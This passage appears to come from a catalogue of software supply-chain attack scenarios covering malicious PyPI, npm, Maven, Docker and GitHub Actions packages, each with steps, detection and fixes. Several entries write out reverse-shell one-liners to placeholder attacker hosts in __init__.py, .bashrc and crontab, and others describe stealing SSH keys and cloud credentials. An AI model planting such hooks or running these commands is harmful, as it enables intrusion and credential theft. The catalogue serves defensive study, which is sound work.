- **Attack Steps**: 1. Attacker builds a Python library py-syntax-checker with a C extension. 2. The extension includes keylogger functionality triggered on import. 3. During pip install, the compiled .so file is placed in site-packages. 4. Once the app starts and imports the module, the C extension hooks keyboard events using OS APIs. 5. Logs are stored locally or exfiltrated silently to the attacker.
- **Detection**: Monitor imported .so file behavior during load
- **Solution**: Scan compiled code and review .whl metadata
- **Tags**: #pypi #keylogger #compiledmodule

## Maven Dependency Includes Obfuscated AWS Token Grabber

- **Attack Type**: Malicious Library
- **Target**: Java microservices
- **Vulnerability**: Obfuscated credential stealing logic
- **MITRE**: T1552
- **Impact**: Secret theft from environment
- **Tools**: Maven Central, Java
- **Scenario**: A malicious Maven dependency uses obfuscated logic to read AWS credentials from environment and system properties.
- **Attack Steps**: 1. Attacker publishes a Maven artifact org.tools:json-mapper-fast. 2. Inside, a class reads AWS_SECRET_ACCESS_KEY, AWS_SESSION_TOKEN, etc., using System.getenv(). 3. Obfuscated Java code (via variable mangling, string encoding) hides this logic. 4. Artifact gets included by mistake in a microservice build. 5. On runtime, credentials are collected and sent to attacker's domain using HttpURLConnection.
- **Detection**: Analyze bytecode for env var access; review outbound HTTP targets
- **Solution**: Use allowlist-based dependency policies
- **Tags**: #maven #awssecrets #java

## Fake CLI Tool Installed via pipx Runs Privilege Escalation Script

- **Attack Type**: Malicious Tooling
- **Target**: Linux dev environments
- **Vulnerability**: Abuse of local CLI tools and sudo perms
- **MITRE**: T1548.003
- **Impact**: Privilege escalation and persistence
- **Tools**: PyPI, pipx
- **Scenario**: A fake Python CLI tool, when installed with pipx, attempts to escalate privileges via sudo misconfigurations.
- **Attack Steps**: 1. Attacker publishes a package fasttool-cli, pretending to be a terminal helper. 2. On install via pipx, it creates a startup script in the venv’s bin path. 3. The script checks if sudo can be run without password for any command (via sudo -l). 4. If allowed, it uses sudo cp to replace common tools (e.g., /usr/bin/ls) with a backdoored binary. 5. Now, every terminal command acts as a backdoor trigger.
- **Detection**: Monitor unusual pipx tools and sudo activity
- **Solution**: Limit sudo scope and disable passwordless use
- **Tags**: #pipx #cli #privesc

## Webpack Plugin Pulls Remote Code During Build

- **Attack Type**: Build Step Injection
- **Target**: Web applications
- **Vulnerability**: Build tool dependency fetches remote script
- **MITRE**: T1608.001
- **Impact**: Client-side compromise and data theft
- **Tools**: Webpack, npm
- **Scenario**: A malicious Webpack plugin fetches remote JavaScript during production builds and embeds it in the output bundle.
- **Attack Steps**: 1. Attacker releases a Webpack plugin called html-meta-injector, promoted as a SEO enhancement tool. 2. During build, it downloads external JavaScript snippets from cdn.badactor.org/script.js. 3. These scripts are dynamically injected into the final HTML and JS bundles. 4. When users load the web app, the external scripts run client-side in their browsers. 5. The attacker can now perform web skimming, session hijacking, or ad injection.
- **Detection**: Monitor Webpack plugins for remote requests
- **Solution**: Avoid dynamic script inclusion during production builds
- **Tags**: #webpack #buildinject #cdnattack

## Malicious PyPI Package Auto-Executes Shell Commands in __init__.py

- **Attack Type**: Malicious Library
- **Target**: Developer machines, CI runners
- **Vulnerability**: Auto-execution during import
- **MITRE**: T1059
- **Impact**: Remote code execution and environment takeover
- **Tools**: Python, pip, netcat
- **Scenario**: A Python library auto-executes a system-level reverse shell inside its __init__.py, compromising every app that imports it.
- **Attack Steps**: 1. The attacker creates a Python package called http-tools-lite and publishes it to PyPI, mimicking popular HTTP helper modules. 2. Inside the package’s __init__.py, which runs automatically when the package is imported, the attacker inserts a line like os.system("bash -i >& /dev/tcp/attacker.com/4444 0>&1"). 3. This reverse shell command opens a connection to the attacker’s server and grants remote shell access to the system. 4. Any developer who installs and imports this package in their Python script unknowingly triggers the reverse shell execution. 5. The attacker now has full access to the environment, including any open files, secrets, SSH keys, or active containers. 6. The reverse shell persists as long as the script is running, enabling reconnaissance or lateral movement.
- **Detection**: Monitor unexpected outbound connections during script import
- **Solution**: Never trust unknown packages; audit __init__.py for runtime behavior
- **Tags**: #pypi #initabuse #reverseshell

## GitHub Action Leaks AWS Credentials from Environment Variables

- **Attack Type**: CI/CD Injection
- **Target**: GitHub CI/CD runners
- **Vulnerability**: Untrusted GitHub Actions
- **MITRE**: T1552.001
- **Impact**: Cloud credential compromise
- **Tools**: GitHub Actions, curl, AWS
- **Scenario**: A malicious GitHub Action uploads AWS credentials from CI runner environment variables to an attacker-controlled endpoint.
- **Attack Steps**: 1. Attacker forks a GitHub Action repo, modifies its entrypoint script to include logic that reads key environment variables like AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, etc. 2. These variables are typically auto-injected into GitHub runners when workflows interact with AWS services. 3. The modified script uses curl to send the values to a malicious server over HTTPS. 4. The attacker submits a PR to a project and references the modified GitHub Action instead of the official one. 5. A developer merges the PR, trusting that the referenced Action is safe. 6. Upon the next pipeline execution, the CI runner unknowingly leaks cloud credentials. 7. The attacker now has full programmatic access to the AWS account, enabling lateral movement, data theft, or resource abuse (e.g., spinning up crypto miners).
- **Detection**: Scan workflows for external Action sources; audit env usage
- **Solution**: Use only pinned SHA-based trusted Actions
- **Tags**: #github #awsleak #workflowpoisoning

## NPM Package Adds Malicious Script to .bashrc for Persistent Access

- **Attack Type**: Malicious Library
- **Target**: Developer laptops
- **Vulnerability**: Abuse of shell init files for persistence
- **MITRE**: T1053.005
- **Impact**: Persistent backdoor via terminal
- **Tools**: Node.js, NPM, bash
- **Scenario**: A malicious Node.js package modifies .bashrc to insert a reverse shell that launches on every terminal session.
- **Attack Steps**: 1. The attacker publishes a package called colors-ui-lite, mimicking legitimate color console libraries. 2. Inside the postinstall script in package.json, they insert logic that appends a line to ~/.bashrc, such as bash -i >& /dev/tcp/attacker.io/5555 0>&1. 3. This reverse shell is triggered every time the user opens a new terminal session. 4. The attacker maintains persistent shell access, without relying on an active process or binary. 5. Any time the machine reboots or new sessions start, the backdoor reactivates, providing long-term control. 6. The attack remains hidden unless the victim inspects their bash startup configuration.
- **Detection**: Monitor changes to .bashrc and startup scripts
- **Solution**: Disable arbitrary writes to shell init files during installs
- **Tags**: #npm #bashrc #persistentshell

## DockerHub Image Drops Cronjob to Execute Root Reverse Shell

- **Attack Type**: Container Supply Chain
- **Target**: Containerized apps
- **Vulnerability**: Cron-based privilege persistence
- **MITRE**: T1053.003
- **Impact**: Root shell persistence in containers
- **Tools**: Docker, bash, cron
- **Scenario**: A Docker image from DockerHub includes a preconfigured cronjob to open a reverse root shell every minute.
- **Attack Steps**: 1. Attacker uploads nginx-plus-tools, a Docker image claiming to enhance NGINX monitoring. 2. Inside the Dockerfile, the attacker adds a malicious crontab in /etc/crontab with the line: * * * * * root bash -i >& /dev/tcp/attacker.com/4444 0>&1. 3. When the container runs, the cron daemon starts automatically, executing the reverse shell every minute. 4. The container runs as root by default, giving the attacker privileged access. 5. The attacker receives repeated shell access regardless of app behavior. 6. Over time, they can explore mounted volumes, steal secrets, or pivot to the host.
- **Detection**: Scan Docker images for crontabs or abnormal startup scripts
- **Solution**: Use trusted, signed base images only
- **Tags**: #dockerhub #cronattack #reverseShell

## PyPI Package Embeds Obfuscated Code to Read SSH Private Keys

- **Attack Type**: Malicious Library
- **Target**: Developer systems
- **Vulnerability**: Obfuscated credential theft
- **MITRE**: T1552.004
- **Impact**: Private SSH key exposure
- **Tools**: Python, PyPI, base64
- **Scenario**: A malicious Python package hides base64-obfuscated code that searches for .ssh/id_rsa and sends the content to an attacker.
- **Attack Steps**: 1. Attacker uploads ssh-helper-lite, pretending to offer SSH config tools. 2. Within the package, a base64 string hides the real malicious code. 3. On import or post-install, the code decodes to a Python script that reads ~/.ssh/id_rsa. 4. The private key is sent via HTTPS POST to keys.attacker.org/upload. 5. Developers using the library unknowingly expose their SSH credentials to the attacker. 6. These keys can then be used to access Git servers, CI runners, or production environments.
- **Detection**: Detect base64 decode patterns in package code
- **Solution**: Restrict read access to .ssh folders
- **Tags**: #pypi #sshkey #obfuscation

## Gradle Plugin Replaces Compiled Class with Backdoor Class File

- **Attack Type**: Plugin Poisoning
- **Target**: Java-based microservices
- **Vulnerability**: Runtime backdoors via class replacement
- **MITRE**: T1609
- **Impact**: Live application compromise
- **Tools**: Gradle, Java
- **Scenario**: A malicious Gradle plugin silently swaps a legitimate compiled .class file with a backdoored version post-build.
- **Attack Steps**: 1. The attacker creates a plugin com.securebuild.injector, marketed as adding security headers to responses. 2. During the Gradle build, the plugin scans for MainController.class and overwrites it with an attacker-crafted version. 3. This malicious .class file includes logic that listens on a hidden TCP port for incoming shell commands. 4. The backdoor is active in all deployed JARs, giving the attacker access upon first production run. 5. Because the class file replacement occurs during build, source code auditing alone won’t detect it. 6. The backdoor remains persistent until the plugin is removed or the JAR is rebuilt cleanly.
- **Detection**: Compare build outputs against expected hashes
- **Solution**: Sign and hash critical build artifacts
- **Tags**: #gradle #java #buildmanipulation

## NPM Script Opens Browser to Fake Login Page for Token Harvesting

- **Attack Type**: Malicious Library
- **Target**: Developer desktops
- **Vulnerability**: Phishing via browser automation in postinstall
- **MITRE**: T1566.002
- **Impact**: Credential/token theft via fake login flow
- **Tools**: NPM, Node.js, phishing
- **Scenario**: A malicious post-install script opens a browser tab to a phishing page that mimics GitHub login, stealing OAuth tokens.
- **Attack Steps**: 1. The attacker creates git-token-helper, claiming to simplify GitHub CLI authentication. 2. In the postinstall script, they add code that opens the user’s default browser to https://github-secure-login.com. 3. The phishing site mimics the GitHub OAuth flow and prompts users to authorize access. 4. When the victim logs in, the OAuth token is captured and stored on the attacker’s backend. 5. These tokens allow full access to the victim’s private repositories, organizations, or GitHub Actions settings. 6. The attack is highly successful as users think it's part of the tool setup process.
- **Detection**: Monitor browser launches from CLI packages
- **Solution**: Disable auto-browser opens in untrusted installs
- **Tags**: #npm #phishing #oauthsteal

## Fake Rust Crate Injects Network Sniffer Binary During Build

- **Attack Type**: Malicious Library
- **Target**: Developer systems
- **Vulnerability**: Abuse of build.rs for system binary injection
- **MITRE**: T1040
- **Impact**: Passive monitoring and data theft
- **Tools**: Rust, Cargo
- **Scenario**: A Rust crate compiles and installs a background network sniffer binary during build using build.rs.
- **Attack Steps**: 1. Attacker uploads netutils-safe crate to crates.io, advertising network diagnostic tools. 2. In build.rs, the attacker adds code that compiles and installs a binary to /usr/local/bin/netwatcher. 3. This binary uses raw sockets to log all outgoing HTTP requests from the machine. 4. The logs are forwarded to the attacker’s server every 10 minutes. 5. Any developer building this crate unknowingly installs a passive traffic sniffer. 6. Credentials, tokens, or API usage data are leaked silently over time.
- **Detection**: Inspect build.rs for write operations to system paths
- **Solution**: Use sandboxed builds and restrict filesystem access
- **Tags**: #rust #networksniffer #crates

## VS Code Extension Intercepts git commit Messages

- **Attack Type**: Extension Supply Chain
- **Target**: Developer IDE
- **Vulnerability**: Git hook injection by extensions
- **MITRE**: T1557.003
- **Impact**: Secret harvesting via Git commit hooks
- **Tools**: VS Code, Git
- **Scenario**: A malicious VS Code extension captures commit messages and leaks them, potentially exposing secrets accidentally committed.
- **Attack Steps**: 1. Attacker uploads a VS Code extension Git Smart Commit, claiming to assist with templated commit messages. 2. It installs a hook script in .git/hooks/commit-msg that intercepts commit messages. 3. Every message (which may include credentials, tokens, or secrets) is sent to an external API. 4. Developers continue using Git as usual, unaware their commit history is being surveilled. 5. The attacker collects these messages to extract tokens, keys, or internal bug tracker references. 6. This facilitates targeted attacks or internal reconnaissance.
- **Detection**: Monitor .git/hooks for unexpected scripts
- **Solution**: Block extensions from writing to Git hooks
- **Tags**: #vscode #githook #commitleak

## Maven Dependency Loads External XML on Class Load

- **Attack Type**: Malicious Library
- **Target**: Java servers
- **Vulnerability**: Remote deserialization via external XML
- **MITRE**: T1059.005
- **Impact**: RCE via insecure class loading
- **Tools**: Java, Maven, XML
- **Scenario**: A Java library pulls external XML definitions during class loading, executing remote deserialization payloads.
- **Attack Steps**: 1. Attacker publishes org.faker.xmlparserpro, mimicking XML utilities. 2. Within static block of a class, they load an external XML file from http://malicious.site/payload.xml. 3. This file includes a deserialization gadget chain that executes arbitrary code on the host. 4. When the class is loaded (e.g., via new or Class.forName()), the payload is triggered. 5. Developers importing the library are vulnerable even without invoking any methods. 6. The attacker gains arbitrary code execution in any system running the app.
- **Detection**: Block remote XML inclusion; inspect static initializers
- **Solution**: Use strict XML parsers and safe class loaders
- **Tags**: #maven #xmlattack #rcedeserialization

## Python Dependency Confusion via PyPI Lookalike

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD pipelines
- **Vulnerability**: Insecure package resolution order
- **MITRE**: T1195.001
- **Impact**: Code execution inside builds
- **Tools**: PyPI, twine, setup.py, Burp Suite
- **Scenario**: Attacker uploads a malicious package to PyPI with the same name as an internal dependency used by the target company’s Python projects.
- **Attack Steps**: 1. Attacker scans GitHub or job listings to identify the target company’s private Python package names (e.g., internal-auth).2. Attacker creates a malicious Python package with the same name, modifies setup.py to include malicious code in the install_requires or setup() function.3. Uses twine upload to push it to PyPI.4. The victim's CI/CD pipeline installs the attacker’s package if it's not scoped to a private repo.5. Malicious code executes during installation or runtime, exfiltrating credentials or opening a reverse shell.6. Attacker monitors for incoming callbacks or shell access.
- **Detection**: Monitor outbound connections, compare installed packages to expected ones
- **Solution**: Always use internal-only indexes for private packages and pin dependencies with hashes
- **Tags**: python, PyPI, CI, reverse shell

## GitHub Action Injecting Dependency Confusion via Composite Actions

- **Attack Type**: Malicious Library Injection
- **Target**: GitHub CI workflows
- **Vulnerability**: Unpinned package references in Actions
- **MITRE**: T1195.002
- **Impact**: Full takeover of CI secrets and tokens
- **Tools**: GitHub Actions, NPM, GitHub Search
- **Scenario**: Exploiting GitHub composite actions that reference unpinned dependencies, an attacker sneaks in a malicious library with the same name.
- **Attack Steps**: 1. Attacker locates open-source projects using composite GitHub Actions and referencing dependencies like install-node@latest without pinning.2. They find or guess internal packages used by the repo's workflows.3. Uploads a public NPM package matching the name.4. The GitHub Action runs and resolves the malicious package instead.5. The attacker’s code executes within the CI environment, stealing GitHub tokens or secrets.6. Credentials are exfiltrated to an external server.
- **Detection**: CI logging, outbound traffic monitoring
- **Solution**: Always pin versions in CI/CD and verify checksums
- **Tags**: github, ci/cd, npm, tokens

## Malicious RubyGem in Internal Fork

- **Attack Type**: Malicious Library
- **Target**: CI jobs with Ruby projects
- **Vulnerability**: No gem source pinning
- **MITRE**: T1195
- **Impact**: Credential theft, lateral movement
- **Tools**: RubyGems, gem build, GitLab CI
- **Scenario**: Attacker crafts a RubyGem with same name as internal-only gem used in private projects, exploiting a lack of gem source pinning.
- **Attack Steps**: 1. Attacker discovers private gem name via job ads or open GitHub issues.2. Creates malicious version with that name, and includes data-stealing logic in post-install hooks.3. Uploads to RubyGems.org.4. Target’s CI/CD job picks public gem due to default source priority.5. Post-install logic triggers, sending environment variables to attacker.6. Attacker retrieves stolen data and uses it to access internal systems.
- **Detection**: Gem audit logs, external connection traces
- **Solution**: Use private gem sources and restrict gem sources
- **Tags**: ruby, gem, ci/cd, gitlab

## Typo-Squatted Python Build Tool

- **Attack Type**: Typo-Squatting
- **Target**: Developers
- **Vulnerability**: Typo in dependency install
- **MITRE**: T1555
- **Impact**: Credential theft
- **Tools**: PyPI, pip, twine, Wireshark
- **Scenario**: A developer mistypes pybuilder as pybuildeer, installing a malicious tool from PyPI that mimics the real one but adds spyware.
- **Attack Steps**: 1. Attacker registers pybuildeer on PyPI with a nearly identical setup to the real tool.2. Inserts spyware in CLI execution path or within build steps.3. Victim mistypes pip install pybuildeer in their terminal.4. Malicious version gets installed silently.5. On execution, the tool runs as expected but leaks .ssh keys or tokens.6. Attacker collects stolen credentials and explores lateral movement.
- **Detection**: Unusual DNS or HTTP outbound patterns
- **Solution**: Block typo-squat names with dependency monitoring
- **Tags**: python, typo, pip, credentials

## Malicious Java Dependency in Maven Mirror

- **Attack Type**: Malicious Library
- **Target**: Java apps via Maven
- **Vulnerability**: Mirror trust assumption
- **MITRE**: T1195.001
- **Impact**: Data exfiltration
- **Tools**: Maven, Burp Suite, JAR tools
- **Scenario**: Attacker compromises a third-party Maven mirror, replacing a widely used logging dependency with a trojanized one.
- **Attack Steps**: 1. Attacker targets an insecure or outdated Maven mirror used by an org.2. Uploads a malicious JAR file with the same groupId/artifactId/version.3. Org’s Maven project fetches the malicious dependency.4. JAR contains a logger that intercepts and sends HTTP headers to external server.5. Attacker collects stolen session cookies or tokens.6. Lateral movement initiated using stolen sessions.
- **Detection**: Monitor JAR hashes & traffic patterns
- **Solution**: Use only signed and verified Maven sources
- **Tags**: java, maven, jar, mirror

## Bypassing npm Audit with Obfuscated Payload

- **Attack Type**: Malicious Package
- **Target**: JavaScript CI/CD builds
- **Vulnerability**: Obfuscated logic bypasses scanners
- **MITRE**: T1027
- **Impact**: Undetected backdoor injection
- **Tools**: Obfuscator.io, npm, VSCode
- **Scenario**: Malicious developer hides a backdoor inside a popular package update by obfuscating it to bypass security scanners.
- **Attack Steps**: 1. Attacker forks a legit package, e.g., request.2. Adds obfuscated malicious payload in rarely used async callback path.3. Publishes it under same name in private repo or typo-squatted one.4. Victim installs the updated package in CI.5. Payload avoids detection during audit (npm audit) due to obfuscation.6. At runtime, payload executes reverse shell only during specific calls.
- **Detection**: Analyze runtime behavior, not just static audit
- **Solution**: Enforce code reviews & sandbox builds
- **Tags**: npm, javascript, audit, obfuscation

## Supply Chain Attack via Composer Package

- **Attack Type**: Dependency Confusion
- **Target**: PHP projects
- **Vulnerability**: Dependency name leakage & version preference
- **MITRE**: T1195.002
- **Impact**: Leakage of config & secrets
- **Tools**: Composer, PHP, Packagist
- **Scenario**: A malicious actor pushes a fake PHP package to Packagist, matching a private one used in internal composer.json.
- **Attack Steps**: 1. Attacker discovers a private internal package name (e.g., corp/logger) in an exposed composer.lock file.2. Publishes the same name publicly on Packagist with minor version bump.3. Composer prefers the newer public version.4. Upon install, the payload executes in post-install script.5. Payload harvests config files and uploads to remote server.6. Attacker uses them for further access or privilege escalation.
- **Detection**: Monitor composer.lock file changes
- **Solution**: Use private repo URLs and exact version pinning
- **Tags**: php, composer, packagist, config

## Misconfigured PyPI Index in Dockerfile

- **Attack Type**: Misconfiguration Exploit
- **Target**: Docker container builds
- **Vulnerability**: Insecure index order
- **MITRE**: T1609
- **Impact**: Secret leakage from container env
- **Tools**: Docker, PyPI, pip
- **Scenario**: Dockerfile mistakenly points to both PyPI and internal repo — attacker exploits ordering to get malicious package installed first.
- **Attack Steps**: 1. Developer writes a Dockerfile for a Python app.2. In requirements.txt, a private package securelib is listed.3. Dockerfile includes both --extra-index-url for internal repo and public PyPI.4. Attacker uploads securelib to PyPI.5. During pip install, it pulls public malicious package first.6. Payload activates on container start, exposing ENV variables.
- **Detection**: Monitor build output and image layers
- **Solution**: Always use --index-url (not --extra) for private-only packages
- **Tags**: docker, pypi, container, secret

## Preinstall Hook in Malicious TypeScript Tool

- **Attack Type**: Malicious Hook
- **Target**: Developer environments
- **Vulnerability**: Abuse of install hooks
- **MITRE**: T1059.003
- **Impact**: Secret exfiltration
- **Tools**: npm, VSCode, Netcat
- **Scenario**: Attacker injects code into preinstall script of a fake TypeScript compiler to capture ENV and tokens.
- **Attack Steps**: 1. Attacker creates typescriptx package mimicking popular TS tools.2. Adds malicious preinstall script in package.json to run code before real install.3. Victim installs it manually or via CI by mistake.4. Script runs immediately, capturing GitHub or AWS credentials.5. Data is sent via curl to attacker's server.6. Attacker reuses credentials for lateral movement.
- **Detection**: Monitor npm lifecycle scripts
- **Solution**: Block packages with install scripts unless vetted
- **Tags**: npm, ts, aws, hooks

## Hidden Backdoor in Go Module

- **Attack Type**: Malicious Library
- **Target**: Go developers
- **Vulnerability**: Logic bombs based on import patterns
- **MITRE**: T1203
- **Impact**: Stealthy remote access
- **Tools**: Go Modules, go get, Netcat
- **Scenario**: Malicious Go module includes a hidden function that only activates on specific import patterns, bypassing normal tests.
- **Attack Steps**: 1. Attacker forks a common Go module.2. Adds a conditional backdoor function that triggers only if imported with alias aliasX.3. Uploads module to GitHub and makes it appear active with fake stars.4. Target developer adds it unknowingly using go get.5. During runtime, the function triggers remote access or environment leak.6. Attacker connects and maintains access stealthily.
- **Detection**: Monitor unusual alias imports and module diffs
- **Solution**: Use internal module proxies & restrict unknown sources
- **Tags**: golang, alias, logicbomb, github

## Exploiting a Package with a Hidden Typosquatting Variant

- **Attack Type**: Dependency Confusion
- **Target**: Developer Workstation
- **Vulnerability**: Typosquatting in public registry
- **MITRE**: T1195.002
- **Impact**: Credential theft, hidden backdoor
- **Tools**: PyPI, Python, Malicious PyPi package
- **Scenario**: An attacker uploads a malicious library with a common misspelling of a popular package to deceive developers into installing it.
- **Attack Steps**: 1. Attacker identifies a high-download Python package like requests. 2. They register a new package on PyPI named requets — a common typo. 3. The malicious package mimics the original but includes a backdoor in setup.py. 4. A developer accidentally installs requets due to a typo in pip install. 5. The install hook executes and collects environment variables, sending them to the attacker. 6. The backdoor also installs the real requests package to hide the mistake. 7. Developer sees no issue, but credentials are already exfiltrated.
- **Detection**: Monitor unexpected packages, file hashes
- **Solution**: Block unverified libraries, enforce allowlist
- **Tags**: #typosquatting #pypi #dependencyconfusion

## Hijacking Abandoned NPM Package

- **Attack Type**: Malicious Libraries
- **Target**: CI/CD Pipeline, NPM Consumers
- **Vulnerability**: Ownership takeover of abandoned project
- **MITRE**: T1195.002
- **Impact**: Credential exfiltration, CI/CD compromise
- **Tools**: NPM, Node.js, Whois
- **Scenario**: A malicious actor takes over an abandoned NPM package, adds a malicious payload, and silently compromises projects that depend on it.
- **Attack Steps**: 1. Attacker searches for dormant NPM packages using npm view <pkg>. 2. Identifies one with no recent updates and unregistered author email. 3. Registers a similar email and contacts NPM support to reclaim ownership. 4. Publishes a new version with the same functionality plus a data exfiltration payload. 5. The malicious update is pulled into downstream projects automatically. 6. When executed, the code uploads .env and AWS keys from disk. 7. Attacker gains access to CI/CD environments and cloud accounts.
- **Detection**: Audit dependency changes, monitor maintainers
- **Solution**: Retire abandoned packages properly, use package pinning
- **Tags**: #npm #takeover #ciattack

## Confusion via Internal Package Named as Public

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD Runner
- **Vulnerability**: Misconfigured package resolution
- **MITRE**: T1195.002
- **Impact**: Build server RCE, data exfiltration
- **Tools**: NPM, Node.js, Burp Suite
- **Scenario**: A developer mistakenly installs a malicious package from the public NPM registry that has the same name as an internal one.
- **Attack Steps**: 1. Attacker finds an internal package named @corp-utils/logger. 2. They publish corp-utils-logger on the public registry, mimicking the internal version. 3. In CI/CD, a script attempts npm install corp-utils-logger. 4. Since it exists publicly, NPM pulls the attacker’s package. 5. The attacker embeds a reverse shell in preinstall hook. 6. When CI runs, it initiates a shell back to the attacker’s server. 7. This leads to remote access to build environments.
- **Detection**: Monitor build scripts and npm logs
- **Solution**: Use internal-only scoped packages (@corp/*)
- **Tags**: #ci/cd #npmconfusion #buildabuse

## Installing Malicious Python Package in a VirtualEnv

- **Attack Type**: Malicious Libraries
- **Target**: Developer Workstation
- **Vulnerability**: Malicious logic in setup hooks
- **MITRE**: T1059.006
- **Impact**: Silent testing phase exfiltration
- **Tools**: PyPI, setup.py, DNS exfiltration
- **Scenario**: Attacker lures a developer into installing a malicious package that behaves differently in virtual environments vs system install.
- **Attack Steps**: 1. Attacker creates a PyPI package called analytics-helper. 2. Inside setup.py, the script checks if it runs inside a virtual environment. 3. If true, it executes a DNS-based exfiltration of environment variables. 4. Developer tests the package in a virtualenv before production. 5. Exfiltration happens silently during testing phase. 6. The developer pushes code assuming it’s safe. 7. Attacker now has keys to production systems or credentials.
- **Detection**: Monitor DNS queries during dev install
- **Solution**: Use sandboxed installs for unverified packages
- **Tags**: #pypi #virtualenv #setuphook

## Installing Trusted-Looking Package with Malicious Binary

- **Attack Type**: Malicious Libraries
- **Target**: Developer System
- **Vulnerability**: Malicious compiled binary inside dependency
- **MITRE**: T1204.002
- **Impact**: Backdoor access via binary execution
- **Tools**: NPM, Ghidra, NSLookup
- **Scenario**: The attacker embeds a precompiled binary in a Node.js package that triggers a payload post-install.
- **Attack Steps**: 1. Attacker publishes a library named fs-tools-helper, claiming it boosts file I/O. 2. Inside the package, a postinstall script drops a binary helper.exe. 3. This binary is disguised as part of the toolchain. 4. Upon installation, it silently runs and opens a hidden port. 5. Attacker connects via reverse shell to this port. 6. Developers rarely inspect binaries, so it evades detection. 7. The shell enables further enumeration of the dev machine.
- **Detection**: Endpoint behavior monitoring, port scanning
- **Solution**: Ban postinstall scripts in policy
- **Tags**: #nodejs #binarypayload #npmhack

## CI/CD Poisoning via package.json script injection

- **Attack Type**: Dependency Confusion
- **Target**: CI/CD Environments
- **Vulnerability**: Poor review of dependency scripts
- **MITRE**: T1059.004
- **Impact**: Remote code execution on build system
- **Tools**: GitHub Actions, NPM
- **Scenario**: A manipulated package.json executes unauthorized commands during the build phase.
- **Attack Steps**: 1. Attacker forks a public repo and adds a dependency with a malicious postinstall script. 2. The dependency runs a curl to download and execute a script. 3. The PR is merged without careful review. 4. On next build, CI automatically installs the dependency. 5. The script runs and opens a shell to attacker’s server. 6. Attacker installs persistence via cron and drops data to a remote server. 7. Maintainers detect unusual outbound traffic days later.
- **Detection**: Monitor new contributor packages, use --ignore-scripts
- **Solution**: Apply stricter code review policies
- **Tags**: #ci/cd #postinstall #supplychain

## Injecting Info-Stealer into Package Description

- **Attack Type**: Malicious Libraries
- **Target**: Python Docs Generator
- **Vulnerability**: Code execution via metadata misuse
- **MITRE**: T1203
- **Impact**: AWS and env key theft
- **Tools**: PyPI, Sphinx
- **Scenario**: A Python package uses obfuscated code in its description field to steal secrets when read by documentation tools.
- **Attack Steps**: 1. Attacker submits pycloud-auth, claiming it simplifies AWS auth. 2. The long description in setup.py includes embedded Base64 Python code. 3. When Sphinx or other doc generators process the description, code is executed via eval. 4. The code searches for .aws/credentials and .env files. 5. Credentials are sent to an attacker-controlled webhook. 6. The developer does not notice, as no warnings are triggered. 7. The project secrets are compromised during documentation phase.
- **Detection**: Scan metadata fields for encoded code
- **Solution**: Sanitize and lint setup files
- **Tags**: #pycloud #sphinx #metadataattack

## Abuse of Transitive Dependencies in Monorepos

- **Attack Type**: Dependency Confusion
- **Target**: Monorepo CI/CD
- **Vulnerability**: Transitive dependency trust issue
- **MITRE**: T1195.002
- **Impact**: CI config leakage, indirect shell
- **Tools**: Yarn, Monorepo Tools
- **Scenario**: Attacker places payload in a 3rd-level dependency that is inherited indirectly.
- **Attack Steps**: 1. Attacker creates lib-a, which depends on lib-b, which depends on lib-c. 2. lib-c is malicious and published to NPM. 3. A large company’s monorepo includes lib-a in several apps. 4. Devs inspect only lib-a, not its tree. 5. During build, lib-c's postinstall opens a shell and fetches environment details. 6. Shell sends CI config and secrets to attacker. 7. Hidden in transitive layers, the attack evades detection.
- **Detection**: Dependency tree scanning
- **Solution**: Lockfile auditing, restrict nested deps
- **Tags**: #transitivedeps #monorepo #yarn

## Manipulating Package Update SemVer to Force Upgrade

- **Attack Type**: Malicious Libraries
- **Target**: GitLab CI
- **Vulnerability**: Exploited SemVer auto-upgrade
- **MITRE**: T1195.002
- **Impact**: Shell access via minor update
- **Tools**: NPM, GitLab CI, Semgrep
- **Scenario**: A seemingly innocuous SemVer bump in a minor package pulls a malicious version during CI builds.
- **Attack Steps**: 1. Attacker contributes a patch to a legit repo config-utils. 2. They increment the version to 1.0.1 and later upload 1.0.2 with a malicious payload. 3. Many CI scripts use ^1.0.0, allowing automatic upgrade. 4. Next CI run pulls 1.0.2, executing the embedded curl command. 5. Script opens reverse shell and downloads extra tools. 6. Attacker now has active CI/CD shell access. 7. Project owners unaware as the changelog looks normal.
- **Detection**: Pin versions, audit SemVer bump triggers
- **Solution**: Enforce static dependency locking
- **Tags**: #semverattack #gitlab #cihack

## Infecting Developer IDE via Linter Plugin Dependency

- **Attack Type**: Malicious Libraries
- **Target**: Developer IDE
- **Vulnerability**: Plugin-based IDE compromise
- **MITRE**: T1204.002
- **Impact**: Repo token theft, IDE compromise
- **Tools**: ESLint, VSCode
- **Scenario**: A malicious ESLint plugin bundled with a popular linter infects developer environments.
- **Attack Steps**: 1. Attacker uploads eslint-plugin-style-checker with hidden payload. 2. The plugin includes a dependency that fetches browser cookies and token data. 3. VSCode auto-installs the plugin via config file. 4. On first lint run, plugin executes the payload. 5. Steals GitHub tokens, sends via HTTPS POST. 6. User has no idea since lint output seems normal. 7. Access tokens are now compromised for further repo access.
- **Detection**: Monitor plugin behavior, restrict auto-installs
- **Solution**: Only allow reviewed plugins
- **Tags**: #eslint #vscode #ideattack

## Malicious GitHub Dependency in package.json

- **Attack Type**: Malicious Libraries
- **Target**: Public JavaScript Apps
- **Vulnerability**: Unverified GitHub-based dependency
- **MITRE**: T1195.002 (Supply Chain Compromise)
- **Impact**: Remote Code Execution or data exfiltration
- **Tools**: GitHub, npm, Visual Studio Code
- **Scenario**: A Node.js project points to a GitHub repo as a direct dependency. The attacker poisons that repo by publishing malicious code to the main branch.
- **Attack Steps**: 1. Attacker finds a GitHub repo referenced directly in a public project’s package.json file as a dependency (e.g., "git+https://github.com/org/lib.git").2. They fork the repository and add a malicious payload (e.g., reverse shell or credential stealer) into the library’s source.3. They make the malicious fork look legitimate by preserving commit history and mimicking author metadata.4. If the repo is automatically referenced or the fork is swapped via typo or misconfig, the victim app includes the poisoned code.5. When the app is built or deployed, the malicious code executes.
- **Detection**: Audit package.json, scan GitHub deps
- **Solution**: Use only pinned versions from verified maintainers. Avoid git-based deps where possible.
- **Tags**: npm, github, nodejs, dependency poisoning

## Malicious Internal Namespace Registry Package

- **Attack Type**: Dependency Confusion
- **Target**: Enterprise Python Apps
- **Vulnerability**: Public/private index confusion
- **MITRE**: T1195.002
- **Impact**: Theft of credentials, remote access
- **Tools**: PyPI, pip, Virtualenv
